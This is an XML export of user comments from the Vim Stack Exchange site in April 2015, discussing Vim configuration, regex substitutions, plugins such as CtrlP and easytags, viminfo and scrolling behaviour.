  <row Id="2939" PostId="2783" Score="0" Text="Another question. Not sure if I should post it here as a comment or ask another general question. How can I find color values for cterm? I'd like to have this theme look the same on gui and terminal but I don't know how to convert hex values to cterm values." CreationDate="2015-04-01T15:48:04.193" UserId="428" />
  <row Id="2940" PostId="2808" Score="0" Text="I just tried replicating this, and it worked for me.  I'm honestly not sure what the problem could be here.  You might try a minimal vim configuration to see if that would work on your machine.  You could then add customizations to potentially identify the conflict.  I don't use YouCompleteMe, so maybe there's something going on there.  Wish I could help more." CreationDate="2015-04-01T17:33:41.563" UserId="1008" />
  <row Id="2941" PostId="2808" Score="0" Text="@aaron hmm... Maybe I'm not sure, I don't know why though. I'll have another look when I get home, if I comment out you complete me" CreationDate="2015-04-01T17:54:28.837" UserId="1443" />
  <row Id="2942" PostId="2808" Score="0" Text="On my phone so I've messed that up! I'll be back at my computer soon though and I'll go over it, thanks" CreationDate="2015-04-01T17:55:06.250" UserId="1443" />
  <row Id="2943" PostId="2804" Score="0" Text="In visual block mode you can press `I` to insert for every row and `A` to append for every row." CreationDate="2015-04-01T19:01:21.373" UserId="544" />
  <row Id="2944" PostId="2780" Score="0" Text="Note, there was a bug in loading buffers, that was just recently fixed." CreationDate="2015-04-01T19:07:33.353" UserId="71" />
  <row Id="2945" PostId="2243" Score="0" Text="@ChristianBrabandt The fix for [774492](https://bugs.debian.org/774492) will make it into Jessie.  The syntax highlighting will have to wait for a backport." CreationDate="2015-04-02T03:41:56.947" UserId="15" />
  <row Id="2946" PostId="2813" Score="0" Text="So you'd need to hit ESC while in normal mode to exit the multi cursor?" CreationDate="2015-04-02T18:13:54.623" UserId="488" />
  <row Id="2947" PostId="2783" Score="1" Text="@dkns Since the terminal colors are largely dependent on the color palette used in the terminal emulator, this is pretty difficult to do. When I was creating my colorscheme, I found it helpful to display what each of the 256 colors looks like. I use [this](https://github.com/ajh17/dotfiles/blob/master/.bin/xterm-colors.py) small script in my bin folder. You can just use a color picker to then choose the colors to ensure the same gui and cterm colors. I would go from cterm-&gt;gui and not the other way around since there are more colors in the gui vim. Hope that helps." CreationDate="2015-04-02T19:16:20.030" UserId="246" />
  <row Id="2948" PostId="2243" Score="0" Text="@jamessan: great, thanks!" CreationDate="2015-04-02T19:18:00.350" UserId="71" />
  <row Id="2949" PostId="2790" Score="0" Text="Hey that did it indeed, thanks! Make it an answer if you want, I'd accept it :)" CreationDate="2015-04-02T19:46:10.407" UserId="1296" />
  <row Id="2950" PostId="2793" Score="4" Text="http://vimhelp.appspot.com/vim_faq.txt.html#faq-17.3" CreationDate="2015-04-03T11:34:53.830" UserId="71" />
  <row Id="2957" PostId="2821" Score="0" Text="Thank you very much. With your answer I learned about `normal!`, `onoremap` and that the `:` is not needed in the script. I will edit my question and remove the `:`s. You can read my asnwer on http://vi.stackexchange.com/a/2823/356. Feel free to edit it if you think it can be improved." CreationDate="2015-04-03T18:14:36.483" UserId="356" />
  <row Id="2958" PostId="512" Score="0" Text="For a closer look on formatting, see: [VIM USER MANUAL - Editing formatted text](http://vimdoc.sourceforge.net/htmldoc/usr_25.html)" CreationDate="2015-04-03T19:38:16.150" UserId="1619" />
  <row Id="2961" PostId="512" Score="0" Text="I just found the very useful `:set fo+=a` option for automatic reformatting of the whole paragraph. Have a look at `:help fo-table` for other options. There also is a nice video tutorial [here](http://vimcasts.org/episodes/hard-wrapping-text/)." CreationDate="2015-04-04T08:26:09.463" UserId="1619" />
  <row Id="2963" PostId="2801" Score="1" Text="I cannot reproduce with GVim 7.4 on Windows and Chrome. All the URLs you mentioned are opened exactly by `gx`." CreationDate="2015-04-04T14:57:01.450" UserId="356" />
  <row Id="2964" PostId="2772" Score="0" Text="I just reproduced this with GVim 7.4 on Windows. If the backslash is not deleted a new buffer is created. An error is issued 'E303: Unable to open swap file for &quot;\!file.txt&quot;, recovery impossible.' This must be because ``\`` is ilegal in Windows filenames." CreationDate="2015-04-04T18:37:15.453" UserId="356" />
  <row Id="2969" PostId="2772" Score="0" Text="@GonçaloRibeiro: yes, this is what I have observed and why I have posted my question. But I want to use the tabulator so that vim opens the *right* (and existing) file without backslash." CreationDate="2015-04-05T09:17:54.430" UserId="985" />
  <row Id="2970" PostId="2772" Score="0" Text="@RenéNyffenegger, yes, I understand. Unfortunately I am not aware of an option that can solve this. This could possibly be considered a bug." CreationDate="2015-04-05T11:06:44.807" UserId="356" />
  <row Id="2971" PostId="2831" Score="0" Text="I was just typing an answer ;-) Here's my solution: `:%s/)\n^\s*{$/) {/`, which also makes sure there's the preceding line ends with a `)`..." CreationDate="2015-04-05T14:08:09.430" UserId="51" />
  <row Id="2972" PostId="2831" Score="0" Text="Yes of course.  The regex could be made safer, but I really was just demonstrating the special characters.   I'll add that to my answer." CreationDate="2015-04-05T14:28:12.263" UserId="865" />
  <row Id="2973" PostId="2831" Score="0" Text="Thanks! It's kind of annoying that you're supposed to use `\n` to represent a line break in the regex, but `^M` (`Ctrl-V M`) to represent a line break in the substitution text. That's just how it is, I guess." CreationDate="2015-04-06T10:24:31.520" UserId="24" />
  <row Id="2974" PostId="2801" Score="1" Text="Confirming the OP's error. Tried with VIM 7.4.473 &amp; 7.4.663. Tried **from prestine user account** (without `.vimrc`), with different terminals (`urxvt`, `sakura`) and different browsers (`g:netrw_browsex_viewer` set to `'uzbl-browser'`/`'firefox'`/`'google-chrome'`." CreationDate="2015-04-06T11:05:23.073" UserId="1631" />
  <row Id="2975" PostId="2832" Score="0" Text="This is a nice idea, but do you know how to get the count in visual mode? v:count1 doesn't seem to work." CreationDate="2015-04-06T12:26:19.573" UserId="1272" />
  <row Id="2977" PostId="2833" Score="0" Text="This does not provide an answer to the question. To critique or request clarification from an author, leave a comment below their post - you can always comment on your own posts, and once you have sufficient [reputation](http://vi.stackexchange.com/help/whats-reputation) you will be able to [comment on any post](http://vi.stackexchange.com/help/privileges/comment)." CreationDate="2015-04-06T15:57:42.607" UserId="467" />
  <row Id="2978" PostId="2833" Score="0" Text="I eventually figured out I needed to open a specific revision from the quickfix list. I nmapped a key command to `:Glog&lt;CR&gt;:cwindow&lt;CR&gt;` to help with this." CreationDate="2015-04-06T16:39:35.017" UserId="1612" />
  <row Id="2979" PostId="2834" Score="5" Text="That *looks* like the information vim normally prints when loading a file, though it's interesting it's being printed twice. Does it still happen when you run with -u NONE?" CreationDate="2015-04-06T18:10:59.923" UserId="72" />
  <row Id="2980" PostId="2835" Score="1" Text="Are you running MacVim in the terminal? (`mvim -v`?) If you are what is the value of your `TERM` variable?" CreationDate="2015-04-06T19:03:46.157" UserId="46" />
  <row Id="2983" PostId="2832" Score="0" Text="@yyt16384, I edited my answer." CreationDate="2015-04-06T21:17:50.247" UserId="356" />
  <row Id="2984" PostId="2836" Score="0" Text="I thought vimdiff syntax highlighting ready had syntax for word diffs in lines." CreationDate="2015-04-07T02:47:13.327" UserId="544" />
  <row Id="2985" PostId="2835" Score="0" Text="@FDinoff No. I run standalone MacVim app outside of terminal. And it's fine in terminal mode as well as vi." CreationDate="2015-04-07T03:12:28.127" UserId="1632" />
  <row Id="2986" PostId="2836" Score="0" Text="Vimdiff does, but the syntax does not support highlight the longest common subsequence, which needs to be identified before it can be highlighted. As far as I can tell, when (vim)diff compares two lines and they differ on their first character (ignoring white space in some cases) the lines are considered different, and they are highlighted from beginning to end. That behavior isn't what I need and described in my question." CreationDate="2015-04-07T07:13:46.663" UserId="1634" />
  <row Id="2987" PostId="2834" Score="0" Text="I don't think it is supposed to wait for me to press Enter as well. No, it's some plugin I think. Guess have to find out what's causing it. The problem is - I don't see that every time." CreationDate="2015-04-07T07:34:25.153" UserId="237" />
  <row Id="2988" PostId="2836" Score="0" Text="I have added some graphics to better illustrate my question." CreationDate="2015-04-07T08:12:02.890" UserId="1634" />
  <row Id="2989" PostId="2836" Score="0" Text="I found the [diffchar](http://www.vim.org/scripts/script.php?script_id=4932) plugin, which can be used to alter vimdiff default highlighting to better match differences. However, this plugin isn't designed to recognize the longest common subsequence (lcs), so I don't know if it can be made to highlight **just** the lcs, as shown in the graphics above." CreationDate="2015-04-07T08:41:51.160" UserId="1634" />
  <row Id="2990" PostId="2839" Score="0" Text="What directory are you starting CtrlP from? If you start it from your home directory, it will have to search a lot of unneeded files." CreationDate="2015-04-07T08:42:41.243" UserId="246" />
  <row Id="2991" PostId="2839" Score="0" Text="I start Vim from within my projects git repository. Usually the root directory of the repo, sometimes in a subdirectory." CreationDate="2015-04-07T08:43:51.920" UserId="1639" />
  <row Id="2992" PostId="2839" Score="1" Text="Is the behavior also reproducible with `:CtrlP` or `:CtrlPCurWD`?" CreationDate="2015-04-07T08:51:31.063" UserId="246" />
  <row Id="2993" PostId="2839" Score="0" Text="Ah, now we're on to something. `:CtrlP` and `CtrlPCurWD` function as expected: they search the correct directories!" CreationDate="2015-04-07T08:53:14.163" UserId="1639" />
  <row Id="2994" PostId="2839" Score="0" Text="I'm not sure if that's a bug in `:CtrlPMixed` in that case. I don't use it myself. Perhaps you can file an issue over at [ctrlpvim/ctrlp.vim](https://github.com/ctrlpvim/ctrlp.vim)." CreationDate="2015-04-07T08:55:14.533" UserId="246" />
  <row Id="2995" PostId="2839" Score="1" Text="Hm, thanks anyway! I've opened an issue, hopefully it'll get fixed soon..." CreationDate="2015-04-07T09:02:02.660" UserId="1639" />
  <row Id="2996" PostId="2832" Score="0" Text="I think I get the point: every normal mode command resets v:count1, so the count needs to be saved before :normal." CreationDate="2015-04-07T10:43:21.793" UserId="1272" />
  <row Id="2997" PostId="2840" Score="1" Text="You can use another separator character, instead of `/`. For instance, `:%s#public_html#public_html/Text-Analysis-Tool#gg`." CreationDate="2015-04-07T10:58:41.857" UserId="259" />
  <row Id="2998" PostId="2834" Score="2" Text="The &quot;press enter&quot; prompt makes sense; it will do that when there is more text to display than would fit, as there is in this case since its displaying a bunch of extra info. See :help press-enter." CreationDate="2015-04-07T15:04:43.683" UserId="72" />
  <row Id="2999" PostId="2842" Score="6" Text="Even more bonus: Use `&amp;` to replace with the entire match. e.g. `:%s#public_html#&amp;/Text-Analysis-Tool#`. For more help see `:h /\0`" CreationDate="2015-04-07T16:16:59.397" UserId="778" />
  <row Id="3000" PostId="2841" Score="0" Text="Thank you [Rick](http://vi.stackexchange.com/users/1641/rick-howe), I can reproduce your picture. The method you outline does help with the specific task in my question. I am also looking for something more general, that can work automatically without needing to adjust the strings before and after the lcs." CreationDate="2015-04-07T16:25:14.053" UserId="1634" />
  <row Id="3002" PostId="2841" Score="0" Text="If the strings before/after the lcs do not look alike, this method doesn't help showing the lcs, try: `repo evaluate   xx  0.5.5.out         |  pack  age  evaluate 0.5.5-x86_64-1.txz`" CreationDate="2015-04-07T16:36:02.410" UserId="1634" />
  <row Id="3003" PostId="2839" Score="0" Text="CtrlP has been dead for over a year." CreationDate="2015-04-07T19:18:25.257" UserId="54" />
  <row Id="3004" PostId="2844" Score="0" Text="Perfect! I didn't know that quickfix list has it's own filetype. Thank you!" CreationDate="2015-04-07T19:24:10.730" UserId="401" />
  <row Id="3005" PostId="2848" Score="0" Text="Oh, yeah this totally the way to go, _ignore_ my answer." CreationDate="2015-04-08T02:39:51.573" UserId="544" />
  <row Id="3006" PostId="2849" Score="1" Text="Why are you looking for that file?" CreationDate="2015-04-08T07:08:04.687" UserId="54" />
  <row Id="3007" PostId="2839" Score="0" Text="@romainl the github repo was last updated 19 days ago? Do you recommend any alternatives?" CreationDate="2015-04-08T08:43:14.893" UserId="1639" />
  <row Id="3008" PostId="2839" Score="0" Text="Latest commit was in july 2013. You can find a link to a supposedly more active fork in the issue tracker." CreationDate="2015-04-08T08:46:36.303" UserId="54" />
  <row Id="3009" PostId="2839" Score="1" Text="yeah, @akshay linked that a few comments above, it's at https://github.com/ctrlpvim/ctrlp.vim and I've installed it, but that still doesn't solve my issue." CreationDate="2015-04-08T08:49:03.657" UserId="1639" />
  <row Id="3010" PostId="2852" Score="1" Text="Except it will be `_viminfo`, not `.viminfo`, in WIndows." CreationDate="2015-04-08T13:45:45.253" UserId="15" />
  <row Id="3011" PostId="2560" Score="2" Text="I've rolled back your Rev 4 → 3. Please post the resolution as a self-answer instead." CreationDate="2015-04-08T13:48:53.400" UserId="24" />
  <row Id="3012" PostId="2856" Score="0" Text="Vim isn't good at semantic highlighting -- instead, it's purely based on regular expressions. But a plugin like [Syntastic](https://github.com/scrooloose/syntastic) could show you errors when you save the file, provided you have the necessary external programs to validate XML." CreationDate="2015-04-08T14:24:17.680" UserId="64" />
  <row Id="3013" PostId="2849" Score="0" Text="Wanted to grab some stuff out of the command history" CreationDate="2015-04-08T15:15:26.790" UserId="398" />
  <row Id="3014" PostId="2851" Score="1" Text="It was indeed in `C:\Users\&lt;username&gt;\_viminfo`. The command `:echo $HOME` works a charm as well." CreationDate="2015-04-08T15:18:27.603" UserId="398" />
  <row Id="3016" PostId="2858" Score="4" Text="Maybe you should say &quot;external tools&quot; instead of &quot;ctags&quot;, because my first suggestion would be cscope." CreationDate="2015-04-08T16:33:27.840" UserId="205" />
  <row Id="3017" PostId="2858" Score="1" Text="One thing that I use is command `gd`. This takes cursor to the local declaration of the variable under cursor." CreationDate="2015-04-08T17:08:03.737" UserId="534" />
  <row Id="3018" PostId="2857" Score="0" Text="Can you put some images where this happens?" CreationDate="2015-04-08T17:11:03.867" UserId="534" />
  <row Id="3019" PostId="2857" Score="2" Text="Press `G`, followed by `ctrl-f`. I think this is what he is talking about." CreationDate="2015-04-08T17:13:17.713" UserId="599" />
  <row Id="3020" PostId="2858" Score="0" Text="@muru I do not want to use any external tools. What I am trying learn are techniques for efficiently navigating a code base just using Vim commands. I know it can be done, but obviously requires deeper Vim knowledge than I have. Possibly not a good SE question since it is so open ended but I do not know where else to look." CreationDate="2015-04-08T18:04:36.650" UserId="1661" />
  <row Id="3021" PostId="2857" Score="0" Text="Exactly, what @Vitor said" CreationDate="2015-04-08T18:35:59.320" UserId="155" />
  <row Id="3022" PostId="2857" Score="0" Text="Try if setting the 'scrolloff' option helps you." CreationDate="2015-04-08T20:46:29.603" UserId="71" />
  <row Id="3023" PostId="2852" Score="0" Text="This answer clarifies why I can't find or $HOME or %HOME% in Windows.. it's a Vim-only variable! So it is accessible from vim command line." CreationDate="2015-04-09T00:04:08.477" UserId="398" />
  <row Id="3024" PostId="2849" Score="1" Text="@ropata `q:` is very helpful for this, it gives you a Vim buffer allowing you to search, edit, etc your command history." CreationDate="2015-04-09T01:41:18.730" UserId="246" />
  <row Id="3025" PostId="2851" Score="1" Text="@ropata The command `echo $HOME` only works in the PowerShell, not in the cmd. But maybe no one is using cmd anymore? :D" CreationDate="2015-04-09T01:45:38.273" UserId="1653" />
  <row Id="3026" PostId="2856" Score="0" Text="@tommcdo: Looks nice! If anyone know a Syntastic-compatible XML Schema-based XML validator (not just an XML validator), then it would make for a fantastic answer :-)" CreationDate="2015-04-09T02:27:02.557" UserId="1083" />
  <row Id="3027" PostId="2864" Score="0" Text="Vim uses cindent for C. See `:help cinoptions-values`." CreationDate="2015-04-09T12:42:26.323" UserId="54" />
  <row Id="3028" PostId="2868" Score="0" Text="This works, but why the weird `call` syntax? Why not just give `Chomp` a parameter called `string` and then pass `a:string` to `substitute`?" CreationDate="2015-04-09T15:03:44.857" UserId="671" />
  <row Id="3029" PostId="2868" Score="1" Text="@bdesham Because `Chomp()` is passing whatever arguments it gets on to `system()`, stripping the trailing newline from its output, and returning that." CreationDate="2015-04-09T15:22:26.083" UserId="15" />
  <row Id="3030" PostId="2868" Score="0" Text="Right. `system()` has an optional `{input}` argument, and this handles any of these generically. If you don't need this, just do it the conventional way." CreationDate="2015-04-09T16:12:17.057" UserId="970" />
  <row Id="3031" PostId="2865" Score="1" Text="Thanks! I undestand the approach. How would I conditionally do this only if the cursor in on the last n lines of the buffer?" CreationDate="2015-04-09T19:12:00.207" UserId="155" />
  <row Id="3032" PostId="2851" Score="0" Text="thanks for the Powershell tip, I called `echo $HOME` from the vim command line with the same result." CreationDate="2015-04-09T20:35:21.710" UserId="398" />
  <row Id="3033" PostId="2865" Score="0" Text="Using the function I provided in the updated answer should keep the scrolling to operate as normal until you get close to the end. If you wish it to be `n` lines rather than the window height then replace the function with your value." CreationDate="2015-04-09T20:45:36.887" UserId="895" />
  <row Id="3034" PostId="2874" Score="0" Text="I think this is probably the approach I’ll actually use, but I accepted the other answer because it’s more generally applicable. (For example, it will remove trailing newlines from a multiline string while leaving other newlines alone.)" CreationDate="2015-04-10T02:28:34.667" UserId="671" />
  <row Id="3035" PostId="2875" Score="1" Text="Have you tried replicating this with `vim -Nu NONE -c 'syntax on'`? Have you followed the debugging tips on this [post](http://vi.stackexchange.com/a/2004/246)" CreationDate="2015-04-10T06:28:56.050" UserId="246" />
  <row Id="3036" PostId="2875" Score="0" Text="What filetype? Any?" CreationDate="2015-04-10T07:07:39.647" UserId="54" />
  <row Id="3037" PostId="2875" Score="1" Text="Ruby. Indeed it is editable with `-u NONE` so it must be some plugin then. Guess the answer to most questions is 'disable plugins until you find the culprit' :(" CreationDate="2015-04-10T08:03:45.290" UserId="237" />
  <row Id="3038" PostId="2875" Score="0" Text="But the problem is - the delay seems to accumulate over time. When I open the file from scratch it is fine. After a while it gets slower and slower." CreationDate="2015-04-10T08:06:13.057" UserId="237" />
  <row Id="3039" PostId="2876" Score="0" Text="Hmm interesting, sounds like this is something tags related. The top line that takes the most time has methods from my other projects. &#xA;&#xA;`TOTAL      COUNT  MATCH   SLOWEST     AVERAGE   NAME               PATTERN&#xA;  0.129674   247    182     0.002365    0.000525  rubyMethodNameTag  \C\&lt;\%(roi\|paginate\|admin_index_attributes\|facilities\|manager\|net_price?\ ....` – this is clearly from the other folder. Disable tags?" CreationDate="2015-04-10T08:24:33.303" UserId="237" />
  <row Id="3040" PostId="2876" Score="0" Text="Do you use a plugin that highlights tags, such as _vim-easytags_? That might indeed cause the slowdown." CreationDate="2015-04-10T08:27:22.187" UserId="970" />
  <row Id="3041" PostId="2876" Score="0" Text="Yep, disabled it, not the numbers are sane again. Thanks." CreationDate="2015-04-10T08:29:18.060" UserId="237" />
  <row Id="3042" PostId="2876" Score="0" Text="Hmm now it's acting up again, this time its: `0.121880   2078   54      0.002260    0.000059  rubySymbol         []})\&quot;':]\@&lt;!\%(\h\|[^\x00-\x7F]\)\%(\w\|[^\x00-\x7F]\)*[!?]\=:[[:space:],]\@=&#xA;  ` – Anything I can do about it?" CreationDate="2015-04-10T09:42:48.763" UserId="237" />
  <row Id="3043" PostId="2876" Score="0" Text="It might be the new regexp engine; try `:set regexpengine=1` (best in a new Vim instance, before opening the Ruby file)." CreationDate="2015-04-10T09:54:01.197" UserId="970" />
  <row Id="3044" PostId="2876" Score="0" Text="I'll add it to `.vimrc` and see if it is going to change anything" CreationDate="2015-04-10T10:27:57.690" UserId="237" />
  <row Id="3045" PostId="2877" Score="3" Text="You can try something like `:!node %`. This will shell out to the external `node` program, passing the current filename as an argument. Output will be displayed on the screen, and you can press Enter to dismiss it." CreationDate="2015-04-10T10:39:18.987" UserId="64" />
  <row Id="3046" PostId="2874" Score="1" Text="Note that this won't work correctly for systems which use something other than `\n` for newline.  `systemlist()` only removes the `\n`, not any `\r`." CreationDate="2015-04-10T14:12:57.660" UserId="15" />
  <row Id="3047" PostId="2883" Score="2" Text="You can't disable it, but you can `:set wrap`" CreationDate="2015-04-10T16:19:44.343" UserId="865" />
  <row Id="3048" PostId="2883" Score="1" Text="Can you give an example (and screenshots), please?" CreationDate="2015-04-10T18:58:15.647" UserId="970" />
  <row Id="3049" PostId="2883" Score="0" Text="@IngoKarkat I added the demo." CreationDate="2015-04-10T20:52:05.577" UserId="1687" />
  <row Id="3050" PostId="2885" Score="0" Text="Hi, thanks for your reply. Do you know some lightweight solutions? Is there any way just to modify the .vimrc file since plug-in may be inconvenient for switching platform/machine." CreationDate="2015-04-10T21:10:07.920" UserId="1080" />
  <row Id="3051" PostId="2883" Score="0" Text="It looks like the horizontal scrolling is off because of `'conceal'`. That would also explain the messed up alignment." CreationDate="2015-04-10T21:54:02.867" UserId="64" />
  <row Id="3052" PostId="2883" Score="0" Text="@tommcdo Yes, that's what I think too - that's why I'd like to disable it. The visible buffer size actually is the whole buffer content, and if I move the cursor behind 1/2 of the (visible) buffer, vim scrolls because I traveled more columns than the window height. This is not necessary." CreationDate="2015-04-10T22:17:04.007" UserId="1687" />
  <row Id="3053" PostId="2883" Score="2" Text="@Enuy, what I mean is that the lines are actually *longer* than the window width, but some text (the bash-like color codes) are concealed. So, Vim thinks it's already reached the edge of the window, but visually it has not. I'd say this qualifies as a bug." CreationDate="2015-04-10T22:21:22.227" UserId="64" />
  <row Id="3054" PostId="2883" Score="1" Text="@tommcdo Yes, I understand what you mean. There is a similiar issue with wrapping lines when only concealed parts at the end of the line are the cause of wrapping and it got WONTFIX from Bram: https://code.google.com/p/vim/issues/detail?id=260" CreationDate="2015-04-10T22:24:43.680" UserId="1687" />
  <row Id="3055" PostId="2883" Score="0" Text="That's why I am searching for an alternative solution - to disable horizontal scrolling altogether." CreationDate="2015-04-10T22:25:13.890" UserId="1687" />
  <row Id="3056" PostId="2883" Score="1" Text="The closest I can think of is if you're in a terminal, you could use `&lt;c-s&gt;` to suspend the terminal so that the screen does not update. You could then blindly make changes and go back to the beginning of the line and hit `&lt;c-q&gt;` to resume. Other perhaps-not-helpful options: ensure that the same number of concealed characters are between every visible character or widen the window." CreationDate="2015-04-10T23:03:26.813" UserId="680" />
  <row Id="3058" PostId="2893" Score="0" Text="The line numbers are there so you could type `114gg` too jump to the second entry. Though I guess that only works if its your current buffer." CreationDate="2015-04-11T07:21:08.353" UserId="895" />
  <row Id="3059" PostId="2894" Score="2" Text="For your third option, it may help that `&lt;C-i&gt;` is the same as `&lt;Tab&gt;` in most terminal emulators." CreationDate="2015-04-11T11:36:27.640" UserId="64" />
  <row Id="3060" PostId="2892" Score="0" Text="Ahh great! `:help map_bar` is what I needed. Thanks. That logic I posted is a little off for the behavior I want so I might have to end up using logical and instead but your solution does let me use `||` so I'll accept it as the answer." CreationDate="2015-04-11T15:07:31.600" UserId="200" />
  <row Id="3061" PostId="2891" Score="1" Text="Yep, that's how it's done. You could pass the range without explicit arguments, see `:h function-range-example`, and use `setline()` instead of deleting and using registers." CreationDate="2015-04-11T18:31:27.593" UserId="970" />
  <row Id="3062" PostId="2891" Score="0" Text="Thank you @IngoKarkat. Vim has a lot of functions that save you from doing a lot of work and it's quite difficult to find them if you didn't use them before." CreationDate="2015-04-11T19:36:27.093" UserId="1690" />
  <row Id="3064" PostId="2897" Score="0" Text="Vim has tags support built-in. You don't need any third-party plugins (other than ctags to generate the tags file of course). [See Effortless Ctags With Git](http://tbaggery.com/2011/08/08/effortless-ctags-with-git.html) article by Tim Pope. I use this and it works wonders. Also see `:help tag-commands` to jump to a tag. I consider ctags pretty essential when working with Vim. It makes navigation super simple, and you can even autocomplete with `:help i_Ctrl-x_Ctrl-]`!" CreationDate="2015-04-12T09:41:05.013" UserId="246" />
  <row Id="3065" PostId="2897" Score="0" Text="Care to add anything here http://vi.stackexchange.com/questions/2630/how-to-set-up-tags-properly/ ?" CreationDate="2015-04-12T10:49:12.913" UserId="237" />
  <row Id="3068" PostId="2899" Score="0" Text="Just disabled `easytags` plugin that was slowing vim down http://vi.stackexchange.com/a/2897/237 and switched to using git hooks as suggested by tpope" CreationDate="2015-04-13T05:06:10.163" UserId="237" />
  <row Id="3069" PostId="2912" Score="10" Text="You can also do `10&lt;C-a&gt;` to add 10 or `r2` to replace the 1 with a 2." CreationDate="2015-04-14T01:32:00.547" UserId="15" />
  <row Id="3070" PostId="2914" Score="0" Text="Something isn't right here, but I'll keep that idea in mind, maybe it can be improved. It should be jumping to the first digit on the current line if any and operate on it. Preferably be mappable to `&lt;c-a&gt;/&lt;c-x&gt;` also." CreationDate="2015-04-14T03:54:14.000" UserId="237" />
  <row Id="3072" PostId="2913" Score="0" Text="I just want text to not move. Why it is doing that in the first place? I thought there is some setting that can improve said behaviour." CreationDate="2015-04-14T04:07:50.093" UserId="237" />
  <row Id="3073" PostId="2913" Score="0" Text="when the window is resized (or split in this case) the cursor is moved to the center of the buffer. Not sure you can do anything besides make split do something different." CreationDate="2015-04-14T04:18:10.370" UserId="895" />
  <row Id="3074" PostId="2906" Score="0" Text="The `autoindent` in the modeline is not necessary, since it is already set by the indentation plugin." CreationDate="2015-04-14T06:58:28.273" UserId="21" />
  <row Id="3075" PostId="2916" Score="0" Text="The fact that it disregards negative number is fine, in fact the default behaviour seemed strange to me. I think it looks much better with `:noh` as well. But the real problem is that it can't use cursor position as a base and thus you can increment only the first digit in the line." CreationDate="2015-04-14T08:38:15.370" UserId="237" />
  <row Id="3076" PostId="2914" Score="0" Text="The updated version. Now jumps forward to the next number or if you are currently over a digit allows you to increment it." CreationDate="2015-04-14T11:56:27.997" UserId="895" />
  <row Id="3077" PostId="2880" Score="2" Text="Does the user you're logged in as have permissions to write in the `.cache` directory? Does that directory exist? Have you tried creating it?" CreationDate="2015-04-14T13:39:22.510" UserId="343" />
  <row Id="3078" PostId="2921" Score="0" Text="This might be it. How can I change this setting? `:set viminfo=:1000` will do?" CreationDate="2015-04-14T14:45:19.337" UserId="1055" />
  <row Id="3079" PostId="2921" Score="1" Text="That would be a non-default value. Check with `:verbose set viminfo?` where this got set, and best change that location. As this option uses a set of values, it's best to use `:set viminfo-=:42 | set viminfo+=:1000` to modify it." CreationDate="2015-04-14T15:03:56.067" UserId="970" />
  <row Id="3080" PostId="2921" Score="0" Text="obviously I have to expand set of values using `+=` instead of just overwriting it. Using verbose I got: `Last set from ~/.vimrc` after some default values. I don't have any setting changing `viminfo` behaviour, so I don't know what to change there. I'll just add this line with `:1000` parameter and accept your answer when I notice increase in history size." CreationDate="2015-04-14T16:54:15.577" UserId="1055" />
  <row Id="3081" PostId="2923" Score="0" Text="Are you asking how to enter visual mode and select a search pattern?" CreationDate="2015-04-14T19:16:53.577" UserId="895" />
  <row Id="3082" PostId="2923" Score="0" Text="Yes. Only not manually, but from a script." CreationDate="2015-04-14T19:51:11.933" UserId="1378" />
  <row Id="3083" PostId="2924" Score="0" Text="Unfortunately this code doesn't work from autocommand. But the variant from the previous answer does. Can't tell for sure why." CreationDate="2015-04-14T20:11:21.267" UserId="1378" />
  <row Id="3084" PostId="2925" Score="0" Text="I needed to select text in autocommand, and this code works. Thanks!" CreationDate="2015-04-14T20:13:25.050" UserId="1378" />
  <row Id="3085" PostId="2924" Score="0" Text="Whoops, forgot to escape `&lt;CR&gt;`. My solution is now virtually the same as jecxjo 's, except the function/command and slightly different interpretation of the problem. I'll leave it here as we described things slightly differently." CreationDate="2015-04-14T20:51:06.627" UserId="680" />
  <row Id="3086" PostId="2927" Score="3" Text="Just let me add: I use a favourite keymapping for saving, and I have bound to it `:update` instead of `:write` to obtain the Original Poster requirement." CreationDate="2015-04-14T21:10:05.527" UserId="311" />
  <row Id="3087" PostId="2931" Score="1" Text="Related: Also see Vim's `-p` option to open each file in different tab pages." CreationDate="2015-04-15T01:54:01.213" UserId="246" />
  <row Id="3088" PostId="2929" Score="1" Text="This needs a space between `w` and `&lt;c-r&gt;`." CreationDate="2015-04-15T01:54:12.963" UserId="268" />
  <row Id="3089" PostId="2929" Score="0" Text="Oops, typos. Fixing..." CreationDate="2015-04-15T02:01:15.333" UserId="895" />
  <row Id="3090" PostId="2914" Score="0" Text="Yes! This is amazing, thank you! I don't understand why the question was downvoted though, this was annoying me since the day one and apparently many people redefine `&lt;c-a&gt;` and `&lt;c-x&gt;` to something else because the default behaviour is not that useful." CreationDate="2015-04-15T04:39:31.087" UserId="237" />
  <row Id="3091" PostId="2914" Score="0" Text="I could see it gets downvoted because the question was for something very specific and the original question sort of changed along the way...the need to jump to the first number. That aside, I actually use `&lt;c-a&gt;` and `&lt;c-x&gt;` a lot. Any time I update a version or increase a range variable, I just `[N]&lt;c-a&gt;` instead of deleting and replacing." CreationDate="2015-04-15T05:13:26.823" UserId="895" />
  <row Id="3093" PostId="2933" Score="0" Text="Hopefully people don't deem it off-topic, because a similar one was asked there http://vi.stackexchange.com/questions/2455/what-additional-features-do-gvim-and-or-macvim-offer-compared-to-vim-inside-a-te" CreationDate="2015-04-15T06:20:10.797" UserId="1315" />
  <row Id="3094" PostId="2933" Score="0" Text="A lot of Vim users never use the TUI version and are more comfortable with GUI tools. Get over it." CreationDate="2015-04-15T07:10:29.183" UserId="54" />
  <row Id="3096" PostId="2933" Score="0" Text="@romainl Using GUI version is fine... It has some other extra features. But I don't see any benefit of using GUI search tool though." CreationDate="2015-04-15T09:48:10.290" UserId="1315" />
  <row Id="3097" PostId="2939" Score="2" Text="OH MY GOD! That's just so perfect, I wish I could up your answer more than one time." CreationDate="2015-04-15T10:15:09.893" UserId="1725" />
  <row Id="3098" PostId="6" Score="0" Text="Bram was probably talking about **[this event](https://twitter.com/pdfkungfoo/status/526097727579750400)**" CreationDate="2015-04-15T10:43:17.330" UserId="1727" />
  <row Id="3099" PostId="2942" Score="0" Text="I [beat you to this conclusion](http://vi.stackexchange.com/a/2941/267) by about a minute, but thanks anyway. I'm not sure why I ever assumed otherwise. I guess I was under the impression that it was doing some sort of Unicode character combining magic to overlay the separator in the edge of the character space, but I realize now that I think about it consciously how ridiculous that would be." CreationDate="2015-04-15T12:31:45.757" UserId="267" />
  <row Id="3100" PostId="2869" Score="0" Text="Thank you. This seems seems to work when I write a new directive. But if I try to reindent an old one, say by doing `gg=G`, it leaves the directives unchanged. How could I make it work in both cases?" CreationDate="2015-04-15T15:19:23.077" UserId="356" />
